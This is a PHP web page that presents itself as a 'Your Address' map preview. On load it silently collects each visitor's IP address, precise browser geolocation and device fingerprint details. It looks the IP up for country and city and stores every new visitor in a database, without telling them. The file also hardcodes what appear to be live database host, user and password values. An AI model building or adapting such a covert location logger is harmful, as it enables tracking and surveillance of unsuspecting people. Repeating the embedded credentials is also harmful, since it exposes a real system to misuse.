<?php
// ------------------
// Error reporting
// ------------------
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ------------------
// Database connection
// ------------------
$servername = "sql206.byetcluster.com"; 
$username   = "icei_39975785";      
$password   = "mgWiKePqBbE9"; 
$dbname     = "icei_39975785_deviceinfo"; 

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) { 
    die("Connection failed: " . $conn->connect_error); 
}

// ------------------
// Save AJAX POST request
// ------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    $ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $lat      = $_POST['latitude'];
    $lon      = $_POST['longitude'];
    $browser  = $_POST['browser'] ?? $_SERVER['HTTP_USER_AGENT'];
    $platform = $_POST['platform'] ?? '';
    $screen   = $_POST['screen'] ?? '';
    $language = $_POST['language'] ?? '';
    $memory   = $_POST['memory'] ?? '';
    $cores    = $_POST['cores'] ?? 0;

    $country = "Unknown";
    $city    = "Unknown";
    if (!empty($ip)) {
        $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        if ($geo && $geo->status === "success") {
            $country = $geo->country;
            $city = $geo->city;
        }
    }

    $check = $conn->prepare("SELECT id FROM device_logs WHERE ip = ? LIMIT 1");
    $check->bind_param("s", $ip);
    $check->execute();
    $check->store_result();

    if ($check->num_rows == 0) {
        $stmt = $conn->prepare("INSERT INTO device_logs 
            (ip, country, city, latitude, longitude, browser, platform, screen, language, memory, cores, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())");

        $stmt->bind_param(
            "ssssssssssi",
            $ip, $country, $city, $lat, $lon, $browser, $platform, $screen, $language, $memory, $cores
        );
        $stmt->execute();
        $stmt->close();
    }
    $check->close();

    echo "Logged successfully";
    exit;
}

// ------------------
// Default location for preview
// ------------------
$defaultAddress = "H73C+QFX Kokernag-verinag road, Forest Block, 192212";
$defaultLat = "33.738";
$defaultLon = "75.117";
?>
<!DOCTYPE html>
<html>
<head>
    <title>Device/Location Info</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        body { font-family: Arial; background: #f4f4f9; text-align:center; padding:50px; }
        h1 { color:#2c3e50; font-size:2.5em; margin-bottom:20px; }
        #map { width:80%; height:400px; margin:30px auto; border-radius:10px; border:2px solid #16a085; }
        input { padding:10px; font-size:1em; width:400px; margin-top:20px; border:1px solid #ccc; border-radius:5px; text-align:left; color:#000; background:#fff; }
    </style>
</head>
<body>
    <h1>Your Address:</h1>
    <input type="text" value="<?php echo $defaultAddress; ?>" readonly>

    <div id="map">
        <iframe 
            width="100%" height="100%" style="border:0;" loading="lazy" allowfullscreen
            src="https://www.google.com/maps?q=<?php echo $defaultLat; ?>,<?php echo $defaultLon; ?>&output=embed">
        </iframe>
    </div>

<script>
window.onload = function() {
    const data = {
        latitude: '<?php echo $defaultLat; ?>',
        longitude: '<?php echo $defaultLon; ?>',
        ip: '',
        browser: navigator.userAgent,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        memory: navigator.deviceMemory || 'Unknown',
        cores: navigator.hardwareConcurrency || 0
    };

    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(res => {
            data.ip = res.ip;

            // Get geolocation if allowed
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.latitude = pos.coords.latitude;
                        data.longitude = pos.coords.longitude;
                        sendData();
                    },
                    () => sendData() // fallback if user denies
                );
            } else {
                sendData();
            }
        }).catch(() => sendData());

    function sendData() {
        $.ajax({
            url: '',
            method: 'POST',
            data: data,
            success: function(res) { console.log(res); },
            error: function(err) { console.error(err); }
        });
    }
};
</script>
</body>
</html>
